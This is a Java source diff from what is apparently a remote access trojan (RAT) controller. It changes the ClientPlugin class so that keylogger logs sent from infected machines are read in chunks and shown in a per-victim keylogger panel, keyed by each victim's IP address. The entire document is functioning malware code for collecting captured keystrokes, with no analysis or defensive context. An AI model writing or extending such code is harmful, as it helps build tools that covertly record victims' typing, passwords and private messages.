@@ -110,16 +110,28 @@ public class ClientPlugin extends RATPlugin {
 				panel.getTree().expandRow(i);
 			}
 		} else if (event.getPacket().getHeader() == LOG_HEADER) {
-			int length = dis.readInt();
-			StringBuilder builder = new StringBuilder();
-			for (int i = 0; i < length; i++) {
-				builder.append(dis.readChar());
+			PanelKeylogger panel = (PanelKeylogger)entry.instances.get(event.getServer().getIP());
+			
+			if (panel != null) {
+				panel.offlineTextPane.setText("");
 			}
 			
-			PanelKeylogger panel = (PanelKeylogger)entry.instances.get(event.getServer().getIP());
-
-			if (panel != null) {
-				panel.setOfflineLog(builder.toString());
+			while (dis.readBoolean()) {
+				int length;
+				if ((length = dis.readInt()) != -1) {
+					StringBuilder builder = new StringBuilder();
+					for (int i = 0; i < length; i++) {
+						builder.append(dis.readChar());
+					}
+					
+					if (panel != null) {
+						panel.appendOffline(builder.toString());
+					}
+				} else {									
+					if (panel != null) {
+						panel.appendOffline(dis.readUTF());
+					}
+				}
 			}
 		}
 	}
